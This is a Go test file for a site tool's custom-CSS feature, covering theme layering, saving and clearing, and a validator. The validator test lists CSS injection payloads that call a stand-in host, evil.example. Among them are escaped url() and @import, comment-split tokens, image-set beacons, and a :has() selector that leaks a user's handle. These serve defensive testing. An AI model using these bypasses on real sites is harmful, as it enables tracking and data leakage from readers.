package theme

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/vdibart/polis-cli/cli-go/pkg/storage"
)

func readStyles(t *testing.T, dir string) string {
	t.Helper()
	b, err := os.ReadFile(filepath.Join(dir, "styles.css"))
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

const autumn = ":root { --color-accent: #b45309; }"

// ⭐ The owner's CSS survives every writer of styles.css: a v3 render, a theme
// switch to another theme, and a v4 (stream) render.
func TestCustomCSSIsLayeredAfterTheThemeOnEveryWrite(t *testing.T) {
	dir := t.TempDir()
	site := storage.At(dir)
	themesDir := filepath.Join(dir, "site", "themes")
	createTestTheme(t, themesDir, "turbo")
	createTestTheme(t, themesDir, "vice")
	if err := SetCustomCSS(site, autumn); err != nil {
		t.Fatal(err)
	}

	for _, name := range []string{"turbo", "vice"} {
		if err := CopyCSS(site, "", name); err != nil {
			t.Fatal(err)
		}
		got := readStyles(t, dir)
		themeCSS, _ := os.ReadFile(filepath.Join(themesDir, name, name+".css"))
		if !strings.HasPrefix(got, string(themeCSS)) || !strings.HasSuffix(strings.TrimSpace(got), autumn) {
			t.Errorf("styles.css after CopyCSS(%s) = %q, want the theme then the custom CSS", name, got)
		}
	}

	// The stream shape concatenates its own stylesheet first.
	for key, body := range map[string]string{
		".polis/bundles/pub.polis.core/shapes/v4/stream.css":   ".stream {}",
		".polis/bundles/pub.polis.core/themes/turbo/turbo.css": ".turbo {}",
	} {
		if err := os.MkdirAll(filepath.Dir(filepath.Join(dir, key)), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(dir, key), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	if err := CopyStreamCSS(site, "turbo"); err != nil {
		t.Fatal(err)
	}
	got := readStyles(t, dir)
	if !strings.HasPrefix(got, ".stream {}\n.turbo {}") || !strings.HasSuffix(strings.TrimSpace(got), autumn) {
		t.Errorf("styles.css after CopyStreamCSS = %q, want shape, theme, then custom", got)
	}
}

func TestNoCustomCSSLeavesStylesAsTheTheme(t *testing.T) {
	dir := t.TempDir()
	createTestTheme(t, filepath.Join(dir, "site", "themes"), "turbo")
	if err := CopyCSS(storage.At(dir), "", "turbo"); err != nil {
		t.Fatal(err)
	}
	themeCSS, _ := os.ReadFile(filepath.Join(dir, "site", "themes", "turbo", "turbo.css"))
	if got := readStyles(t, dir); got != string(themeCSS) {
		t.Errorf("with no custom CSS, styles.css = %q, want the theme's CSS byte for byte", got)
	}
}

func TestSetCustomCSSKeepsThePreviousAndClears(t *testing.T) {
	site := storage.At(t.TempDir())
	if err := SetCustomCSS(site, "a {}"); err != nil {
		t.Fatal(err)
	}
	if err := SetCustomCSS(site, "b {}"); err != nil {
		t.Fatal(err)
	}
	if got, _ := GetCustomCSS(site); got != "b {}" {
		t.Errorf("GetCustomCSS = %q, want b {}", got)
	}
	if prev, _ := os.ReadFile(site.Path(customCSSPrevKey)); string(prev) != "a {}" {
		t.Errorf("previous = %q, want a {}", prev)
	}
	if err := SetCustomCSS(site, "  \n"); err != nil {
		t.Fatal(err)
	}
	if got, err := GetCustomCSS(site); got != "" || err != nil {
		t.Errorf("after clearing, GetCustomCSS = %q, %v", got, err)
	}
	if prev, _ := os.ReadFile(site.Path(customCSSPrevKey)); string(prev) != "b {}" {
		t.Errorf("clearing should keep what it cleared, previous = %q", prev)
	}
}

func TestValidateCustomCSS(t *testing.T) {
	ok := []string{
		"",
		autumn,
		"body { background: url(data:image/png;base64,AAAA); }",
		"h1 { background: url('img/leaf.png'); }",
		`h1 { background: url("/leaf.png"); }`,
	}
	for _, css := range ok {
		if err := ValidateCustomCSS(css); err != nil {
			t.Errorf("ValidateCustomCSS(%q) = %v, want accepted", css, err)
		}
	}
	bad := []string{
		"@import url(https://evil.example/x.css);",
		"@IMPORT 'x.css';",
		"body { background: url(https://evil.example/track.png); }",
		"body { background: url('//evil.example/x.png'); }",
		"body { background: url(javascript:alert(1)); }",
		strings.Repeat("a", MaxCustomCSSBytes+1),
		// The bypasses the 2026-11-08 security scan found in the old regex check:
		`body:has(#polis-nav-root[data-handle="bob"])::after{content:"";background-image:image-set("https://evil.example/h?bob" 1x)}`,
		`x{background-image:-webkit-image-set("https://evil.example/a" 1x)}`,
		`x{background:url(https\3a //evil.example/a)}`,
		`x{background:u\72l(https://evil.example/a)}`,
		`html{background:url(/\/evil.example/a)}`,
		`@\69mport "x.css";`,
		`x{background:ur/**/l(https://evil.example/a)}`,
		`x{background:URL(https://evil.example/a)}`,
		"x{background:url(\"/\t/evil.example/a\")}",
		`x{background:image("https://evil.example/a")}`,
		`x{background:cross-fade(url(a.png), url(b.png), 50%)}`,
		`@font-face{font-family:x;src:local(x)}`,
		`@namespace svg "http://www.w3.org/2000/svg";`,
		`x{color:red} /* never closed`,
	}
	for _, css := range bad {
		if err := ValidateCustomCSS(css); err == nil {
			t.Errorf("ValidateCustomCSS(%.60q) accepted, want refused", css)
		}
	}
}

func TestThemePropertiesReadsTheRootBlock(t *testing.T) {
	dir := t.TempDir()
	key := filepath.Join(dir, ".polis/bundles/pub.polis.core/themes/leaf/leaf.css")
	if err := os.MkdirAll(filepath.Dir(key), 0o755); err != nil {
		t.Fatal(err)
	}
	css := "/* x */\n:root {\n  --color-bg: #111;\n  /* note */\n  --color-accent: rgba(1, 2, 3, 0.5);\n}\nbody { --not-root: 1; }\n"
	if err := os.WriteFile(key, []byte(css), 0o644); err != nil {
		t.Fatal(err)
	}
	props, err := ThemeProperties(storage.At(dir), "leaf")
	if err != nil {
		t.Fatal(err)
	}
	if len(props) != 2 || props[0] != (Property{"--color-bg", "#111"}) || props[1] != (Property{"--color-accent", "rgba(1, 2, 3, 0.5)"}) {
		t.Errorf("ThemeProperties = %+v", props)
	}
}

// ⛔ A custom.css written by any path other than SetCustomCSS (by hand, a
// restore, an older build) is checked again at render and withheld from
// readers when it fails.
func TestAFailingCustomCSSIsWithheldAtRender(t *testing.T) {
	site := storage.At(t.TempDir())
	bad := `x{background-image:image-set("https://evil.example/a" 1x)}`
	if err := site.Store().Put(context.Background(), CustomCSSKey, []byte(bad)); err != nil {
		t.Fatal(err)
	}
	if err := writeStyles(site, []byte("body{color:black}")); err != nil {
		t.Fatal(err)
	}
	out, err := site.Store().Get(context.Background(), "styles.css")
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(out), "evil.example") {
		t.Fatal("custom CSS that fails the check reached styles.css")
	}
	if !strings.Contains(string(out), "withheld") || !strings.HasPrefix(string(out), "body{color:black}") {
		t.Fatalf("styles.css = %q; want the theme and a withheld note", out)
	}
}
